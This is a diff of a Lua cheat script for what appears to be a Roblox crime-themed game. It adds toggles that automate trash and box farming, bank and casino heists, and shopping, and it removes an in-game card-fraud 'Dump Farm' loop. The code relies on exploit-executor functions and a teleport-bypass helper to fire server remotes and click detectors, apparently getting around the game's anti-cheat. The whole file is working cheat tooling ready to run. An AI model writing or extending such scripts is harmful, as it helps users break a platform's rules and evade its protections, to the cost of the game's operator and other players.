+                if not TRASH_R then return end
+                local part = p.Parent
+                if part and part:IsA("BasePart") and p.Enabled then
+                    BYPASS_TP(part.Position)
+                    task.wait(0.5)
+                    FORCE_HOLD(p)
+                    task.wait(0.2)
+                    -- Wait for the bag to disappear or cooldown
+                    task.wait(5)
+                end
+            end
+        end
+        ADD_TGL(C_EXTRAS, "Trash Farm", false,
+            function(v)
+                TRASH_R = v; if v then
+                    task.spawn(function()
+                        while TRASH_R do
+                            pcall(DO_TRASH); task.wait(2)
+                        end
+                    end)
+                end
+            end)
+
+        local _BOX_FARM = false
+        local function DO_BOX_FARM()
+            local GS = game:GetService("GuiService")
+            local playerGui = LPLR:WaitForChild("PlayerGui")
+            local mainScreen = playerGui:WaitForChild("MainScreen")
+            local characterChat = mainScreen:WaitForChild("CharacterChat")
+            local buttonsFrame = characterChat:WaitForChild("Buttons")
+
+            local function clickButton(targetText)
+                for _, child in ipairs(buttonsFrame:GetChildren()) do
+                    if child:IsA("Frame") then
+                        local label = child:FindFirstChildWhichIsA("TextLabel")
+                        local btn = child:FindFirstChildWhichIsA("TextButton")
+                        if label and btn and label.Text == targetText then
+                            GS.SelectedObject = btn
+                            task.wait(0.15)
+                            keypress(0x0D)
+                            task.wait(0.05)
+                            keyrelease(0x0D)
+                            return true
+                        end
+                    end
+                end
+                return false
+            end
+
+            local function clickNPC()
+                local npc = game.Workspace.Map.NPC["Tyreek's Shop"]
+                local clickDetector = npc:FindFirstChild("ClickDetector")
+
+                if clickDetector then
+                    fireclickdetector(clickDetector)
+                end
+            end
+
+            local hrp = LPLR.Character and LPLR.Character:FindFirstChild("HumanoidRootPart")
+            if not hrp then return end
+
+            -- INICIAR TRABAJO
+            BYPASS_TP(Vector3.new(-37, 90, 279))
+            task.wait(0.5)
+            clickNPC()
+            task.wait(1)
+            clickButton("Get Job")
+            task.wait(1)
+            clickButton("Nvm")
+            task.wait(1)
+
+            -- BUCLE DE FARM (TRANSPORTAR CAJAS)
+            while _BOX_FARM do
+                local char = LPLR.Character
+                local pBox = workspace.Map.JobModels.GasStation:FindFirstChild("PickBox")
+                local dBox = workspace.Map.JobModels.GasStation:FindFirstChild("DropBox")
+
+                if char and char:FindFirstChild("HumanoidRootPart") and pBox and dBox then
+                    hrp = char.HumanoidRootPart
+                    local hum = char:FindFirstChildOfClass("Humanoid")
+
+                    -- Ir al PickBox
+                    BYPASS_TP(pBox.Position + Vector3.new(0, 3, 0))
+                    task.wait(0.4)
+
+                    local retries = 0
+                    while _BOX_FARM and retries < 10 do
+                        if LPLR.Backpack:FindFirstChild("CrateBox") or char:FindFirstChild("CrateBox") then break end
+                        BYPASS_TP(pBox.Position + Vector3.new(0, 3, 0))
+                        task.wait(0.3)
+                        retries = retries + 1
+                    end
+
+                    if not _BOX_FARM then break end
+
+                    -- Equipar Caja Segura
+                    local bCrate = LPLR.Backpack:FindFirstChild("CrateBox")
+                    if bCrate then hum:EquipTool(bCrate) end
+
+                    -- Ir al DropBox y Entregar
+                    BYPASS_TP(dBox.Position + Vector3.new(0, 3, 0))
+                    task.wait(0.2)
+
+                    while _BOX_FARM and (LPLR.Backpack:FindFirstChild("CrateBox") or char:FindFirstChild("CrateBox")) do
+                        local c = LPLR.Backpack:FindFirstChild("CrateBox")
+                        if c then hum:EquipTool(c) end
+                        BYPASS_TP(dBox.Position + Vector3.new(0, 3, 0))
+                        task.wait(0.2)
+                    end
                 else
-                    if not hasDump then
-                        if not HAS_IN_BAG("Blank Card") then
-                            NOTIFY("Dump Farm", "Buying Blank Card...", 2)
-                            StorePurchase:InvokeServer(UncleMisc["Blank Card"]); task.wait(0.5)
-                        end
-                        local track = workspace.CardFraud.Track1s:FindFirstChild("Track1") or
-                            workspace.CardFraud.Track1s:GetChildren()[3]
-                        local interact = track and track:FindFirstChild("Interact")
-                        if interact then
-                            NOTIFY("Dump Farm", "Cloning on Track1...", 2)
-                            LPLR.Character.HumanoidRootPart.CFrame = interact:GetPivot() * CFrame.new(0, 3, 0)
-                            task.wait(0.5)
-                            local card = LPLR.Backpack:FindFirstChild("Blank Card")
-                            if card then LPLR.Character.Humanoid:EquipTool(card) end
-                            task.wait(0.2)
-                            fireproximityprompt(interact:FindFirstChildOfClass("ProximityPrompt") or interact)
-                            local startWait = tick()
-                            while not GET_ANY_DUMP() and tick() - startWait < 5 do task.wait(0.5) end
-                        end
-                        hasDump = GET_ANY_DUMP()
+                    task.wait(1)
+                end
+            end
+
+            -- CERRAR TURNO (Bucle apagado)
+            hrp = LPLR.Character and LPLR.Character:FindFirstChild("HumanoidRootPart")
+            if hrp then
+                BYPASS_TP(Vector3.new(-37, 90, 279))
+                task.wait(0.5)
+                clickNPC()
+                task.wait(1)
+                clickButton("End my shift")
+                task.wait(0.5)
+
+                GS.SelectedObject = nil
+                characterChat.Visible = false
+                mainScreen.Visible = false
+            end
+        end
+
+        ADD_TGL(C_EXTRAS, "Box farm", false, function(v)
+            _BOX_FARM = v; if v then task.spawn(DO_BOX_FARM) end
+        end)
+
+        --[[
+        -- ── CAR BUILDER CARD ─────────────────────────────────────────────────────────
+        local C_CARBUILD = MK_CARD(FL, "Car Builder", "rbxassetid://77304301427389")
+        local CB_SEL = nil
+        local CB_RUN = false
+
+        local CB_CARS = {
+            ["Lexus LS400"] = {
+                ID = "Lexus",
+                UnbuiltPrefix = "UnBuilt Lexus - ",
+                FinalName = "Lexus LS400",
+                Parts = { "LEXUSWindows", "LEXUSTrunk", "LEXUSRightSideDoors", "LEXUSRearRightWheel", "LEXUSRearRightPanel", "LEXUSRearLeftWheel", "LEXUSRearLeftPanel", "LEXUSRearBumper", "LEXUSHood", "LEXUSFrontRightWheel", "LEXUSFrontLeftWheel", "LEXUSFrontBumper", "LEXUSLeftSideDoors" }
+            },
+            ["Scat Pack"] = {
+                ID = "Scat",
+                UnbuiltPrefix = "UnBuilt Scat - ",
+                FinalName = "Scat Pack",
+                Parts = { "SPTrunk", "SPFrontLeftWheel", "SPFrontRightDoor", "SPRearBumper", "SPFrontBumper", "SPRearRightDoor", "SPRearLeftWheel", "SPFrontRightWheel", "SPHood", "SPWindows", "SPFrontLeftDoor", "SPRearLeftDoor" }
+            },
+            ["2011 Toyota Camry"] = {
+                ID = "Toyota",
+                UnbuiltPrefix = "UnBuilt Toyota - ",
+                FinalName = "2011 Toyota Camry",
+                Parts = { "TOYOTAFrontLeftWheel", "TOYOTAWindows", "TOYOTAFrontRightDoor", "TOYOTARearRightWheel", "TOYOTARearLeftWheel", "TOYOTAFrontRightWheel", "TOYOTARearRightDoor", "TOYOTATrunk", "TOYOTARearBumper", "TOYOTARearLeftDoor", "TOYOTAHood", "TOYOTAFrontBumper", "TOYOTAFrontLeftDoor" }
+            }
+        }
+
+        -- Exact copies of carBl.lua helpers
+        local function CB_TP(pos)
+            pcall(function()
+                local char = LPLR.Character
+                if char and char:FindFirstChild("HumanoidRootPart") then
+                    char.HumanoidRootPart.CFrame = CFrame.new(pos + Vector3.new(0, 3, 0))
+                end
+            end)
+        end
+
+        local function CB_FIRE(p)
+            if not p then return end
+            pcall(function()
+                if fireproximityprompt then
+                    fireproximityprompt(p)
+                else
+                    p:InputBegan(Enum.UserInputType.MouseButton1); task.wait(0.04); p:InputEnded(Enum.UserInputType
+                        .MouseButton1)
+                end
+            end)
+        end
+
+        local function CB_EQUIP(name)
+            local tool = LPLR.Backpack:FindFirstChild(name)
+            if tool then
+                local humanoid = LPLR.Character and LPLR.Character:FindFirstChild("Humanoid")
+                if humanoid then
+                    humanoid:EquipTool(tool); task.wait(0.12); return true
+                end
+            elseif LPLR.Character and LPLR.Character:FindFirstChild(name) then
+                return true
+            end
+            return false
+        end
+
+        local function CB_FIND(text)
+            for _, v in ipairs(workspace:GetDescendants()) do
+                if v:IsA("ProximityPrompt") and (v.ActionText == text or v.ObjectText == text) then return v end
+            end
+        end
+
+        local function CB_OCCUPIED()
+            for _, v in ipairs(workspace:GetChildren()) do
+                if v.Name:sub(1, 8) == "UnBuilt " and not v.Name:find(LPLR.Name) then return true end
+            end
+            return false
+        end
+
+        local CB_TGL_OBJ
+        CB_TGL_OBJ = ADD_TGL(C_CARBUILD, "Auto Build Farm", false, function(v)
+            if v and not CB_SEL then
+                NOTIFY("Car Builder", "Please select a vehicle before starting!", 4)
+                task.defer(function()
+                    CB_RUN = false
+                    if CB_TGL_OBJ and CB_TGL_OBJ.SET then
+                        CB_TGL_OBJ:SET(false, true)
                     end
-                    if hasDump then
-                        NOTIFY("Dump Farm", "Searching for available ATM...", 2)
-                        local atms = workspace.CardFraud.ATMs:GetChildren()
-                        local finished = false
-                        for _, atm in ipairs(atms) do
-                            if finished or not DumpFarmEnabled then break end
-                            local interact = atm:FindFirstChild("Interact")
-                            if interact then
-                                if tick() > (ATM_COOLDOWNS[atm] or 0) then
-                                    LAST_ATM_USED = atm; LAST_ERROR_RECEIVED = nil
-                                    LPLR.Character.HumanoidRootPart.CFrame = interact:GetPivot() * CFrame.new(0, 2, 0)
-                                    task.wait(0.5)
-                                    LPLR.Character.Humanoid:EquipTool(hasDump)
-                                    task.wait(0.2)
-                                    fireproximityprompt(interact:FindFirstChildOfClass("ProximityPrompt") or interact)
-                                    task.wait(2.5)
-                                    if LAST_ERROR_RECEIVED == "recently" then
-                                        NOTIFY("Dump Farm", "ATM busy, skipping...", 2)
-                                    elseif LAST_ERROR_RECEIVED == "drained" then
-                                        NOTIFY("Dump Farm", "Mental exhaustion detected.", 3); finished = true
-                                    else
-                                        NOTIFY("Dump Farm", "Success! Starting wait.", 3)
-                                        GLOBAL_COOLDOWN_UNTIL = tick() + FRAUD_COOLDOWN_TIMEValue; finished = true
+                end)
+                return
+            end
+            CB_RUN = v
+            if v then
+                task.spawn(function()
+                    while CB_RUN do
+                        -- Workshop guard
+                        while CB_RUN and CB_OCCUPIED() do
+                            NOTIFY("Car Builder", "Workshop occupied! Waiting...", 5)
+                            task.wait(2)
+                        end
+                        if not CB_RUN then break end
+
+                        local data = CB_CARS[CB_SEL]
+                        pcall(function()
+                            -- Phase 1: Buy
+                            CB_TP(Vector3.new(232, 101, 2688))
+                            task.wait(0.6)
+                            game:GetService("ReplicatedStorage").SpawnUnbuilt:FireServer(data.ID)
+                            task.wait(0.4)
+                            game:GetService("ReplicatedStorage").RequestPurchaseAllParts:FireServer(data.ID, data.Parts)
+                            task.wait(0.6)
+
+                            -- Phase 2: Workshop
+                            CB_TP(Vector3.new(218, 101, 2668))
+                            task.wait(0.6)
+
+                            -- Phase 3: Assemble (exact carBl.lua logic)
+                            local carModel = workspace:WaitForChild(data.UnbuiltPrefix .. LPLR.Name, 10)
+                            if carModel then
+                                local pPrompt = carModel:FindFirstChild("Prompt") and
+                                    carModel.Prompt:FindFirstChild("ProximityPrompt")
+                                    or carModel:FindFirstChildWhichIsA("ProximityPrompt", true)
+                                CB_TP(Vector3.new(218, 101, 2668))
+                                for _, partName in ipairs(data.Parts) do
+                                    if not CB_RUN then break end
+                                    if CB_EQUIP(partName) then
+                                        CB_FIRE(pPrompt)
+                                        task.wait(0.18)
                                     end
                                 end
                             end
-                        end
-                        if not finished and not LAST_ERROR_RECEIVED then task.wait(5) end
-                    end
-                end
-                task.wait(1)
-            end
-            NOTIFY("Dump Farm", "System disabled.", 3)
-        end
 
-        local function HOOK_NOTIFS()
-            local Event = game:GetService("ReplicatedStorage"):WaitForChild("RemoteEvents"):WaitForChild("Notification")
-            if not _G.GLOBAL_NOTIF_HOOKED then
-                _G.GLOBAL_NOTIF_HOOKED = true
-                Event.OnClientEvent:Connect(function(...)
-                    local args = { ... }
-                    local type, msg = args[1], tostring(args[2] or "")
-                    local low_msg = msg:lower()
-                    if type == "error" and low_msg:find("buy gold bars") then
-                        local secs = tonumber(msg:match("%d+"))
-                        if secs then HeistWaitUntil = tick() + secs + 5 end
-                    end
-                    if type == "error" then
-                        if low_msg:find("recently used") then
-                            LAST_ERROR_RECEIVED = "recently"
-                            if LAST_ATM_USED then
-                                local secs = PARSE_TIME(msg)
-                                ATM_COOLDOWNS[LAST_ATM_USED] = tick() + (secs > 0 and secs or 138)
+                            -- Phase 4: Sell (exact carBl.lua logic)
+                            local finalCar, dPrompt = nil, nil
+                            local timeout = tick() + 15
+                            while CB_RUN and tick() < timeout do
+                                for _, v in ipairs(workspace:GetChildren()) do
+                                    if v.Name == data.FinalName and v:FindFirstChild("DriveSeat") then
+                                        dPrompt = v.DriveSeat:FindFirstChild("ProximityPrompt")
+                                        if dPrompt then
+                                            finalCar = v; break
+                                        end
+                                    end
+                                end
+                                if dPrompt then break end
+                                task.wait(0.05)
                             end
-                        elseif low_msg:find("mentally drained") then
-                            LAST_ERROR_RECEIVED = "drained"
-                            local secs = PARSE_TIME(msg)
-                            GLOBAL_COOLDOWN_UNTIL = tick() + (secs > 0 and secs or FRAUD_COOLDOWN_TIMEValue)
-                        end
+
+                            if finalCar and dPrompt then
+                                CB_TP(finalCar.DriveSeat.Position)
+                                task.wait(0.1)
+                                CB_FIRE(dPrompt)
+                                task.wait(1.5)
+
+                                local targetSellPos = Vector3.new(530, 93, -415)
+                                for _ = 1, 5 do
+                                    finalCar:PivotTo(CFrame.new(targetSellPos))
+                                    if LPLR.Character and LPLR.Character:FindFirstChild("HumanoidRootPart") then
+                                        LPLR.Character.HumanoidRootPart.CFrame = CFrame.new(targetSellPos +
+                                            Vector3.new(0, 2, 0))
+                                    end
+                                    task.wait(0.08)
+                                end
+                                task.wait(0.6)
+
+                                local sellP = CB_FIND("Sell Built Car")
+                                if sellP then
+                                    CB_TP(sellP.Parent.Position)
+                                    CB_FIRE(sellP)
+                                    NOTIFY("Car Builder", "Profit collected!", 3)
+                                    task.wait(1.5)
+                                end
+                            end
+                        end)
+                        task.wait(0.5)
                     end
                 end)
             end
-        end
+        end)
 
-        local function DO_BOX_LOOP()
-            NOTIFY("Box Farm", "Starting Box Stacker...", 3)
-            while BoxFarmEnabled do
-                pcall(function()
-                    local b = workspace.BoxStocker.Box.Node
-                    LPLR.Character.HumanoidRootPart.CFrame = b:GetPivot() * CFrame.new(0, 2, 0)
-                    task.wait(1.1); fireproximityprompt(b.ProximityPrompt); task.wait(1.1)
-                    local p = workspace.BoxStocker.Pallet.Node
-                    LPLR.Character.HumanoidRootPart.CFrame = p:GetPivot() * CFrame.new(0, 2, 0)
-                    task.wait(1.1); fireproximityprompt(p.ProximityPrompt); task.wait(1.1)
-                end)
-                task.wait(0.1)
-            end
-            NOTIFY("Box Farm", "Box Stacker disabled.", 3)
-        end
+        ADD_DRP(C_CARBUILD, "Select Vehicle", function(v) CB_SEL = v end)
+            :ADD_MANY({ "Lexus LS400", "Scat Pack", "2011 Toyota Camry" })
+        --]]
 
-        local function DO_TRAP_LOOP()
-            NOTIFY("Trap House", "Starting advanced monitoring...", 3)
-            local lastWatchNotify = 0
+        local C_BANK = MK_CARD(FR, "Bank farm", "rbxassetid://139426182681638")
 
-            local function GetActiveStashes()
-                local folder = workspace:FindFirstChild("TrapHouse") and workspace.TrapHouse:FindFirstChild("Stashes")
-                if not folder then return {} end
-                local active = {}
-                for _, item in ipairs(folder:GetChildren()) do
-                    local interact = item:FindFirstChild("Interact")
-                    local prompt = interact and interact:FindFirstChildOfClass("ProximityPrompt")
-                    if prompt and prompt.Enabled then table.insert(active, prompt) end
-                end
-                return active
-            end
+        local function RUN_BANK_HEIST()
+            local b = workspace.Map.JobModels.Bank.StackOfMoney
 
-            while TrapRobEnabled do
-                pcall(function()
-                    local active = GetActiveStashes()
-                    if #active > 0 then
-                        local rPos = LPLR.Character and LPLR.Character:GetPivot()
-                        NOTIFY("Trap House", "Stashes detected! Preparing...", 2)
+            -- Detect if vault is already open (Transparency check)
+            local isAlreadyOpen = false
+            local anyMoneyAvailable = false
 
-                        if not PREPARE_MASK() then
-                            NOTIFY("Trap House", "Error preparing mask. Retrying...", 3)
-                            return
-                        end
-
-                        for _, p in ipairs(active) do
-                            if not TrapRobEnabled then break end
-                            TELEPORT(p.Parent.Position)
-                            BURST_INTERACT(p)
-                            task.wait(0.4)
-                        end
-
-                        -- Verification loop
-                        repeat
-                            if not TrapRobEnabled then break end
-                            task.wait(0.5)
-                            local remaining = GetActiveStashes()
-                            if #remaining > 0 then
-                                local p = remaining[1]
-                                TELEPORT(p.Parent.Position)
-                                BURST_INTERACT(p)
-                                task.wait(0.4)
-                            end
-                        until #GetActiveStashes() == 0 or not TrapRobEnabled
-
-                        if rPos and TrapRobEnabled then
-                            TELEPORT(rPos.Position)
-                            NOTIFY("Trap House", "Round finished. Area clear.", 3)
-                        end
+            for _, child in ipairs(b:GetDescendants()) do
+                if child.Name == "Money" and child:IsA("MeshPart") then
+                    if child.Transparency > 0 then
+                        isAlreadyOpen = true     -- Someone already opened it!
                     else
-                        if tick() - lastWatchNotify > 20 then
-                            NOTIFY("Trap House", "Monitoring...", 3)
-                            lastWatchNotify = tick()
+                        anyMoneyAvailable = true -- There is still money left
+                    end
+                end
+            end
+
+            if isAlreadyOpen and not anyMoneyAvailable then
+                NOTIFY("Bank Heist", "Bank is empty! Waiting...", 4)
+                return
+            end
+
+            local Event = game:GetService("ReplicatedStorage").Events.ServerEvent
+
+            if not isAlreadyOpen then
+                -- Vault is CLOSED, need to buy gear
+                local cashStr = LPLR.PlayerGui.MainScreen.Profile.CashAmount.Text
+                local cash = tonumber((cashStr:gsub("%D", ""))) or 0
+
+                if cash < 4600 then
+                    NOTIFY("Bank Heist", "Vault closed & not enough cash ($4,600 needed)!", 5)
+                    return
+                end
+
+                NOTIFY("Bank Heist", "Vault closed. Buying gear...", 3)
+                Event:FireServer("BuyItemTool", "DuffelBag", false)
+                task.wait(0.3)
+                Event:FireServer("BuyItemTool", "SecureEntry", false)
+                task.wait(0.5)
+
+                BYPASS_TP(Vector3.new(149, 90, -155))
+                task.wait(0.8)
+
+                local backpack = LPLR:FindFirstChild("Backpack")
+                local tool = backpack and backpack:FindFirstChild("SecureEntry")
+                if tool then
+                    LPLR.Character.Humanoid:EquipTool(tool)
+                else
+                    local charTool = LPLR.Character:FindFirstChild("SecureEntry")
+                    if not charTool then
+                        NOTIFY("Bank Heist", "Failed to buy/equip SecureEntry!", 4)
+                        return
+                    end
+                end
+                task.wait(0.4)
+                Event:FireServer("PackBank")
+                task.wait(0.8)
+            else
+                NOTIFY("Bank Heist", "Vault OPEN! Buying DuffelBag & Bypassing entry...", 4)
+                Event:FireServer("BuyItemTool", "DuffelBag", false)
+                task.wait(0.5)
+            end
+
+            -- Step 5: TP to Money Stacks
+            BYPASS_TP(Vector3.new(153, 88, -126))
+            task.wait(1)
+
+            -- Step 6: Collect Money (Huge randomized list)
+            local detectors = {
+                b:GetChildren()[2]:GetChildren()[2].ClickDetector,
+                b:GetChildren()[2]:GetChildren()[7].ClickDetector,
+                b:GetChildren()[2]:GetChildren()[4].ClickDetector,
+                b:GetChildren()[2].Money.ClickDetector,
+                b.Model:GetChildren()[7].ClickDetector,
+                b.Model.Money.ClickDetector,
+                b.Model:GetChildren()[4].ClickDetector,
+                b.Model:GetChildren()[2].ClickDetector,
+                b.Model:GetChildren()[5].ClickDetector,
+                b.Model:GetChildren()[6].ClickDetector,
+                b.Model:GetChildren()[3].ClickDetector,
+                b:GetChildren()[7].Money.ClickDetector,
+                b:GetChildren()[7]:GetChildren()[3].ClickDetector,
+                b:GetChildren()[7]:GetChildren()[7].ClickDetector,
+                b:GetChildren()[7]:GetChildren()[4].ClickDetector,
+                b:GetChildren()[7]:GetChildren()[2].ClickDetector,
+                b:GetChildren()[7]:GetChildren()[5].ClickDetector,
+                b:GetChildren()[7]:GetChildren()[6].ClickDetector,
+                b:GetChildren()[5]:GetChildren()[3].ClickDetector,
+                b:GetChildren()[5]:GetChildren()[7].ClickDetector,
+                b:GetChildren()[5].Money.ClickDetector,
+                b:GetChildren()[5]:GetChildren()[4].ClickDetector,
+                b:GetChildren()[5]:GetChildren()[2].ClickDetector,
+                b:GetChildren()[5]:GetChildren()[5].ClickDetector,
+                b:GetChildren()[5]:GetChildren()[6].ClickDetector,
+                b:GetChildren()[2]:GetChildren()[3].ClickDetector,
+                b:GetChildren()[2]:GetChildren()[5].ClickDetector,
+                b:GetChildren()[2]:GetChildren()[6].ClickDetector,
+                b:GetChildren()[4]:GetChildren()[3].ClickDetector,
+                b:GetChildren()[4]:GetChildren()[7].ClickDetector,
+                b:GetChildren()[4].Money.ClickDetector,
+                b:GetChildren()[4]:GetChildren()[4].ClickDetector,
+                b:GetChildren()[4]:GetChildren()[2].ClickDetector,
+                b:GetChildren()[4]:GetChildren()[5].ClickDetector,
+                b:GetChildren()[4]:GetChildren()[6].ClickDetector,
+                b:GetChildren()[8]:GetChildren()[3].ClickDetector,
+                b:GetChildren()[6]:GetChildren()[7].ClickDetector,
+                b:GetChildren()[6].Money.ClickDetector,
+                b:GetChildren()[6]:GetChildren()[4].ClickDetector,
+                b:GetChildren()[6]:GetChildren()[2].ClickDetector,
+                b:GetChildren()[6]:GetChildren()[5].ClickDetector,
+                b:GetChildren()[6]:GetChildren()[6].ClickDetector,
+                b:GetChildren()[6]:GetChildren()[3].ClickDetector,
+                b:GetChildren()[3]:GetChildren()[3].ClickDetector,
+                b:GetChildren()[3]:GetChildren()[7].ClickDetector,
+                b:GetChildren()[3].Money.ClickDetector,
+                b:GetChildren()[3]:GetChildren()[4].ClickDetector,
+                b:GetChildren()[3]:GetChildren()[2].ClickDetector,
+                b:GetChildren()[3]:GetChildren()[5].ClickDetector,
+                b:GetChildren()[3]:GetChildren()[6].ClickDetector,
+                b:GetChildren()[8]:GetChildren()[7].ClickDetector,
+                b:GetChildren()[8].Money.ClickDetector,
+                b:GetChildren()[8]:GetChildren()[4].ClickDetector,
+                b:GetChildren()[8]:GetChildren()[2].ClickDetector,
+                b:GetChildren()[8]:GetChildren()[5].ClickDetector,
+                b:GetChildren()[8]:GetChildren()[6].ClickDetector
+            }
+
+            local available = {}
+            for _, d in ipairs(detectors) do
+                -- Check if parent money is still there
+                pcall(function()
+                    if d and d.Parent and d.Parent.Transparency == 0 then
+                        table.insert(available, d)
+                    end
+                end)
+            end
+
+            local count = math.random(10, 11)
+            for i = 1, math.min(count, #available) do
+                local idx = math.random(1, #available)
+                local det = table.remove(available, idx)
+                pcall(fireclickdetector, det)
+                task.wait(0.15)
+            end
+
+            NOTIFY("Bank Heist", "Money collected! Delivering...", 3)
+            BYPASS_TP(Vector3.new(980, 231, -493))
+            task.wait(2)
+            NOTIFY("Bank Heist", "Heist complete!", 5)
+        end
+
+        local HEIST_RUNNING = false
+        local LAST_HEIST_TICK = 0 -- Persiste aunque apagues el toggle
+
+        ADD_TGL(C_BANK, "Auto Bank Heist", false, function(v)
+            HEIST_RUNNING = v
+            if HEIST_RUNNING then
+                task.spawn(function()
+                    while HEIST_RUNNING do
+                        local timeSinceLast = tick() - LAST_HEIST_TICK
+                        if timeSinceLast < 300 then
+                            local remain = math.ceil(300 - timeSinceLast)
+                            NOTIFY("Bank Heist", "Persistent cooldown active! Waiting " .. remain .. "s", 5)
+                            task.wait(remain)
+                        end
+
+                        if not HEIST_RUNNING then break end
+
+                        pcall(RUN_BANK_HEIST)
+                        LAST_HEIST_TICK = tick() -- Actualizamos el tiempo global
+
+                        if HEIST_RUNNING then
+                            NOTIFY("Bank Heist", "Heist finished! 5 min cooldown started.", 5)
+                            -- Countdown Notifications
+                            for i = 4, 1, -1 do
+                                task.wait(60)
+                                if not HEIST_RUNNING then break end
+                                NOTIFY("Bank Heist", "Cooldown: " .. i .. " min remaining...", 3)
+                            end
+                            if HEIST_RUNNING then task.wait(60) end -- final minute
                         end
                     end
                 end)
+            end
+        end)
+
+        ADD_BTN(C_BANK, "Server Hop", ServerHop)
+
+        -- ── CASINO FARM CARD ────────────────────────────────────────────────────────
+        local C_CASINO = MK_CARD(FR, "Casino farm", "rbxassetid://123267471411753")
+
+        local function RUN_CASINO_FARM()
+            local startPrompt = workspace.SilverBackTeleport.Start:FindFirstChild("ProximityPrompt")
+            if startPrompt and startPrompt.ActionText:find("Cooldown") then
+                NOTIFY("Casino Farm", "Map Cooldown active (18 mins). Sleeping...", 4)
+                return false
+            end
+
+            NOTIFY("Casino Farm", "Starting Heist...", 3)
+            game:GetService("ReplicatedStorage").Events.ServerEvent:FireServer("BuyItemTool", "CasinoBag", false)
+            task.wait(0.5)
+
+            BYPASS_TP(Vector3.new(1324, 130, 390))
+            task.wait(0.5)
+            if startPrompt then fireproximityprompt(startPrompt) end
+
+            task.wait(7)
+
+            local function LOOT_20()
+                BYPASS_TP(Vector3.new(1386, 115, 268))
+                task.wait(1)
+                local loot = {}
+                local miscs = workspace.SilverBackHeist.Robbables.Miscs
+                local safes = workspace.SilverBackHeist.Robbables.Safes
+                for _, v in ipairs(miscs:GetDescendants()) do
+                    if v:IsA("ClickDetector") and (v:IsDescendantOf(miscs.Money)) then table.insert(loot, v) end
+                end
+                for _, v in ipairs(safes:GetDescendants()) do
+                    if v:IsA("ClickDetector") and v.Parent.Name == "Money" then table.insert(loot, v) end
+                end
+                local count = 0
+                for _, cd in ipairs(loot) do
+                    if cd and cd.Parent and (not cd.Parent:IsA("BasePart") or cd.Parent.Transparency < 1) then
+                        fireclickdetector(cd)
+                        count = count + 1
+                        task.wait(0.15)
+                        if count >= 20 then break end
+                    end
+                end
+                BYPASS_TP(Vector3.new(980, 231, -492))
+                task.wait(1)
+                local sellPart = workspace.Map.JobModels.Bank.SellModel:FindFirstChild("DistancePart")
+                if sellPart then
+                    firetouchinterest(LPLR.Character.HumanoidRootPart, sellPart, 0)
+                    task.wait(0.1)
+                    firetouchinterest(LPLR.Character.HumanoidRootPart, sellPart, 1)
+                end
                 task.wait(1)
             end
-            NOTIFY("Trap House", "Monitoring disabled.", 3)
+
+            LOOT_20()
+            return true
         end
 
-        ADD_TGL(C_EXTRAS, "Dump Farms", false, function(v)
-            DumpFarmEnabled = v
+        local LAST_CASINO_TICK = 0
+        local CASINO_RUNNING = false
+        ADD_TGL(C_CASINO, "Auto Casino", false, function(v)
+            CASINO_RUNNING = v
             if v then
-                task.spawn(HOOK_NOTIFS); task.spawn(DO_DUMP_LOOP)
+                task.spawn(function()
+                    while CASINO_RUNNING do
+                        local timeSinceLast = tick() - LAST_CASINO_TICK
+                        if timeSinceLast < 300 then
+                            local remain = math.ceil(300 - timeSinceLast)
+                            NOTIFY("Casino Farm", "Persistent Cooldown: " .. remain .. "s remaining", 5)
+                            task.wait(remain)
+                        end
+
+                        if not CASINO_RUNNING then break end
+
+                        local success = RUN_CASINO_FARM()
+                        if success then
+                            LAST_CASINO_TICK = tick()
+                            NOTIFY("Casino Farm", "Heist Finished! 5m Cooldown started.", 5)
+                        else
+                            -- Map is on cooldown, check again in 1 minute instead of spamming every 2s
+                            task.wait(60)
+                        end
+                        task.wait(2)
+                    end
+                end)
             end
         end)
 
-        ADD_TGL(C_EXTRAS, "Box farm", false, function(v)
-            BoxFarmEnabled = v
-            if v then task.spawn(DO_BOX_LOOP) end
+        -- ── AUTO EXTRACT SYSTEM (BRAIN STRUCTURE) ──────────────────────────────────
+        local C_EXTRACT = MK_CARD(FR, "Auto Extract", "rbxassetid://122233645421733")
+        local SEL_EXTRACT = "Green Extract"
+        local SEL_QTY = 1
+        local EXT_RUNNING = false
+
+        local function FIND_AVAILABLE_STATION()
+            for _, s in ipairs(workspace.Map.JobModels:GetChildren()) do
+                if s:FindFirstChild("StatusPart") and s.StatusPart:FindFirstChild("DrankStatusPrompt") and s.StatusPart.DrankStatusPrompt.Enabled then
+                    return s
+                end
+            end
+            return nil
+        end
+
+        local function BUY_EXT_STUFF()
+            local shops = workspace.Gunshops
+
+            -- 1. Buy Selected Extract
+            local e_p = GET_PRP(shops, SEL_EXTRACT)
+            if e_p then
+                BYPASS_TP(e_p.Parent.Position); task.wait(1)
+                for i = 1, SEL_QTY do
+                    FORCE_HOLD(e_p); task.wait(3.2)
+                end
+            end
+
+            -- 2. Buy Water (Remote)
+            for i = 1, SEL_QTY do
+                game:GetService("ReplicatedStorage").Events.ServerEvent:FireServer("BuyItemTool", "Water", false)
+                task.wait(0.3)
+            end
+
+            -- 3. Buy Sugar
+            local s_p = GET_PRP(shops, "Sugar")
+            if s_p then
+                BYPASS_TP(s_p.Parent.Position); task.wait(1)
+                for i = 1, SEL_QTY do
+                    FORCE_HOLD(s_p); task.wait(3.2)
+                end
+            end
+
+            -- 4. Buy Empty Cups (x2)
+            local c_p = GET_PRP(shops, "Empty Cup")
+            if c_p then
+                BYPASS_TP(c_p.Parent.Position); task.wait(1)
+                for i = 1, (SEL_QTY * 2) do
+                    FORCE_HOLD(c_p)
+                    NOTIFY("Auto Extract", "Buying Cup " .. i .. "/" .. (SEL_QTY * 2), 1)
+                    task.wait(3.2)
+                end
+            end
+        end
+
+        ADD_TGL(C_EXTRACT, "Auto Extract", false, function(v)
+            EXT_RUNNING = v
+            if v then
+                task.spawn(function()
+                    while EXT_RUNNING do
+                        -- 1. Inventory Check
+                        local function HAS_ING()
+                            local needed = { [SEL_EXTRACT] = 1, ["Water"] = 1, ["Sugar"] = 1, ["Empty Cup"] = 2 }
+                            local cur = {}
+                            for _, i in ipairs(LPLR.Backpack:GetChildren()) do cur[i.Name] = (cur[i.Name] or 0) + 1 end
+                            if LPLR.Character then
+                                for _, i in ipairs(LPLR.Character:GetChildren()) do cur[i.Name] = (cur[i.Name] or 0) + 1 end
+                            end
+                            for item, qty in pairs(needed) do if (cur[item] or 0) < qty then return false end end
+                            return true
+                        end
+
+                        if not HAS_ING() then
+                            NOTIFY("Auto Extract", "Shopping for ingredients...", 3)
+                            BUY_EXT_STUFF()
+                            task.wait(1)
+                        end
+                        if not EXT_RUNNING then break end
+
